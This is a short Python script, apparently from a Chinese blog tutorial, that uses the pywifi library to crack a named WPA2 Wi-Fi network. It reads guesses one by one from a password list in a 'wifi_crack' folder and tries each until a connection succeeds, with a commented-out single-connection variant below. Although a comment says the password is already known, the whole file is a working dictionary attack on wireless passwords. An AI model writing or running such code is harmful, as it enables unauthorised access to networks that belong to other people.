import pywifi
import time

# 定义未链接状态
DISCONNECTED_STATUS = [pywifi.const.IFACE_INACTIVE, pywifi.const.IFACE_DISCONNECTED]

iface = pywifi.PyWiFi().interfaces()[0]
iface.scan()
print("Wifi疯狂扫描中，请给博主点个赞点个关注等待15秒")
time.sleep(1)


# 创建wifi配置，这里配置的是我已经知道密码的wifi
profile = pywifi.Profile()
profile.ssid = "Ziroom-1002-5G"
with open("./wifi_crack/这里没有存密码.txt", "r") as fp:
    profile.key = fp.readline()
    
    while profile.key:
        # 固定配置
        print(profile.key)
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            print("恭喜你已经连接上wifi ", profile.ssid, " 了！")
            break
        profile.key = fp.readline()

# # 固定配置
# profile.auth = pywifi.const.AUTH_ALG_OPEN
# profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
# profile.cipher = pywifi.const.CIPHER_TYPE_CCMP

# iface.remove_all_network_profiles()
# tmp_profile = iface.add_network_profile(profile)
# iface.connect(tmp_profile)
# print("Wifi偷摸的连接中...")
# time.sleep(1)
# if iface.status() == pywifi.const.IFACE_CONNECTED:
#     print("恭喜你已经连接上wifi ", profile.ssid, " 了！")
# else:
#     print("你啥破电脑啊，换个新的吧")